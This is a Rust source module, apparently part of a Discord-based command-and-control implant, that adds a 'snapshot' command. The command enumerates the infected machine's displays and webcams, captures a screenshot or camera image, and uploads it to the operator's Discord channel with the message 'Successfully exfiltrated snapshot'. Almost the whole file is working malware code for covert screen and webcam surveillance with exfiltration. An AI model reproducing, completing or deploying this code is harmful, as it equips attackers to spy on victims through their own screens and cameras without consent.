use crate::{
    errors::DiscordC2Error,
    libraries::nokhwa_wrapper::wrapper,
};

use chrono::Utc;
use nokhwa::utils::CameraIndex;
use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::{
        application::command::CommandOptionType,
        application::interaction::application_command::{
            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
        },
        application::interaction::InteractionResponseType,
        channel::AttachmentType,
    },
};
use std::borrow::Cow;
use screenshots::Screen;


pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    let cameras = wrapper::list_devices().unwrap(); //TODO: check for errors
    let screens = Screen::all().unwrap(); //TODO: check for errors

    // Create the snapshot command.
    let snapshot_command = command
        .name("snapshot")
        .description("Grabs a snapshot from the screen or the camera");

    // Create the sub-command group.
    snapshot_command
        .create_option(|option|
            option
                .name("type")
                .description("Type of snapshot to grab")
                .kind(CommandOptionType::SubCommandGroup)
                .create_sub_option(|sub_command| {
                    let mut screen_option = sub_command
                        .name("screen")
                        .description("Take a snapshot of the screen")
                        .kind(CommandOptionType::SubCommand);
                    screen_option = screen_option.create_sub_option(|option|{
                        let mut screen_list_option = option
                            .name("screen_list")
                            .description("Choose a screen from the list")
                            .kind(CommandOptionType::Integer)
                            .required(true);

                        for i in 0..screens.len(){
                            screen_list_option = screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
                        }
                        screen_list_option
                    });
                    screen_option
                }
                )
                .create_sub_option(|sub_command| {
                    let mut camera_option = sub_command
                        .name("camera")
                        .description("Take a snapshot from a camera")
                        .kind(CommandOptionType::SubCommand);

                    camera_option = camera_option.create_sub_option(|option| {
                        let mut camera_list_option = option
                            .name("camera_list")
                            .description("Choose a camera from the list")
                            .kind(CommandOptionType::Integer)
                            .required(true);

                        // Add integer choices to the camera list option based on the number of cameras.
                        for i in 0..cameras.len() {
                            camera_list_option = camera_list_option.add_int_choice(format!("{} ({})", &cameras[i].human_name(), &cameras[i].description()), i as i32);
                        }

                        camera_list_option
                    });

                    camera_option
                })
        );

    command
}


pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
        .options.to_vec();

    // Match the first option, which contains the snapshot type.
    if let Some(snapshot_type_option) = option.get(0) {
        match snapshot_type_option.name.as_str() {
            "screen" => if let Some(screen_option) = snapshot_type_option.options.get(0) {
                if let Some(CommandDataOptionValue::Integer(screen_index)) = screen_option.resolved {
                    Ok(Some(process_screen_option(screen_index as i32)?))
                } else {
                    Err(DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string()))
                }
            } else {
                Err(DiscordC2Error::InvalidInput("Screen option not found.".to_string()))
            },
            "camera" => {
                if let Some(camera_option) = snapshot_type_option.options.get(0) {
                    if let Some(CommandDataOptionValue::Integer(camera_index)) = camera_option.resolved {
                        Ok(Some(process_camera_option(CameraIndex::Index(camera_index as u32))?))
                    } else {
                        Err(DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string()))
                    }
                } else {
                    Err(DiscordC2Error::InvalidInput("Camera option not found.".to_string()))
                }
            }
            _ => {
                println!("Invalid snapshot type: {}", snapshot_type_option.name);
                Err(DiscordC2Error::InvalidInput("Invalid snapshot type.".to_string()))
            }
        }
    } else {
        Err(DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string()))
    }
}

/// Handles a snapshot command from a user, which triggers a file exfiltration process and sends
/// the resulting file back to the user as a message attachment. The command must contain valid
/// options specifying the source of the snapshot. Returns `Ok(())` if the command was handled
/// successfully, or a `DiscordC2Error` if an error occurred during the process.
///
/// # Arguments
///
/// * `ctx` - A reference to the context for the current bot session.
/// * `command` - A reference to the interaction command that triggered this handler.
///
/// # Examples
///
/// ```no_run
/// use serenity::prelude::*;
/// use serenity::model::application::interaction::application_command::ApplicationCommandInteraction;
///
/// async fn handle_command(ctx: &Context, command: &ApplicationCommandInteraction) {
///     if command.kind != ApplicationCommandInteractionDataOptionType::SubCommand {
///         return;
///     }
///
///     match command.data.name.as_str() {
///         "snapshot" => {
///             if let Err(err) = handle_snapshot(ctx, command).await {
///                 eprintln!("Error handling snapshot command: {}", err);
///             }
///         }
///         _ => {}
///     }
/// }
/// ```
pub async fn snapshot_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
    let content = run(&command.data.options).await?;

    let (message_content, message_file) = match content {
        Some(content) => (
            "Successfully exfiltrated snapshot:".to_owned(),
            Some(content),
        ),
        None => (
            "There was no file available".to_owned(),
            None,
        ),
    };

    command.create_interaction_response(&ctx.http, |response| {
        response
            .kind(InteractionResponseType::ChannelMessageWithSource)
            .interaction_response_data(|message| {
                message.content(message_content);
                if let Some(file) = message_file {
                    message.add_file(file);
                }
                message
            })
    }).await?;

    Ok(())
}

/// Takes a snapshot from the camera with the specified index and returns it as an `AttachmentType`
/// object containing the snapshot data and filename. The filename is generated based on the current
/// UTC time. If an error occurs while initializing the camera or taking the snapshot, the function
/// returns a `DiscordC2Error` with a message indicating the nature of the error.
///
/// # Arguments
///
/// * `index` - The index of the camera to take a snapshot from.
///
/// # Examples
///
/// ```no_run
/// use serenity::model::channel::AttachmentType;
/// use crate::errors::DiscordC2Error;
/// use nokhwa::utils::CameraIndex;
///
/// async fn take_snapshot(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
///     let attachment = process_camera_option(index)?;
///     // Do something with the snapshot attachment
///     Ok(attachment)
/// }
/// ```
///
/// # Errors
///
/// Returns a `DiscordC2Error` if an error occurs while initializing the camera or taking the snapshot.
fn process_camera_option(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let camera = wrapper::init_static_cam(index)?;
    let snapshot_bytes = wrapper::snapshot(camera)?;

    let attachment = AttachmentType::Bytes {
        data: Cow::from(snapshot_bytes),
        filename: format!("screenshot{}.jpeg", Utc::now()),
    };

    Ok(attachment)
}

/// Takes a screenshot of the screen with the specified index and returns it as an `AttachmentType`
/// object containing the screenshot data and filename. The filename is generated based on the
/// current UTC time. If the screen with the specified index is not found, the function returns
/// a `DiscordC2Error` with a message indicating the invalid index.
///
/// # Arguments
///
/// * `index` - The index of the screen to take a screenshot of, starting from 0.
///
/// # Examples
///
/// ```no_run
/// use serenity::model::channel::AttachmentType;
/// use crate::errors::DiscordC2Error;
///
/// async fn take_screenshot(index: i32) -> Result<AttachmentType<'static>, DiscordC2Error> {
///     let attachment = process_screen_option(index)?;
///     // Do something with the screenshot attachment
///     Ok(attachment)
/// }
/// ```
///
/// # Errors
///
/// Returns a `DiscordC2Error` if an error occurs while capturing the screenshot or generating the
/// attachment.
fn process_screen_option(index: i32) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let screens = Screen::all().unwrap();
    let screen = screens.get(index as usize).unwrap();
    let buffer = screen.capture()?.buffer().to_owned();

    let attachment = AttachmentType::Bytes {
        data: Cow::from(buffer),
        filename: format!("screenshot{}.png", Utc::now()),
    };
    Ok(attachment)
}

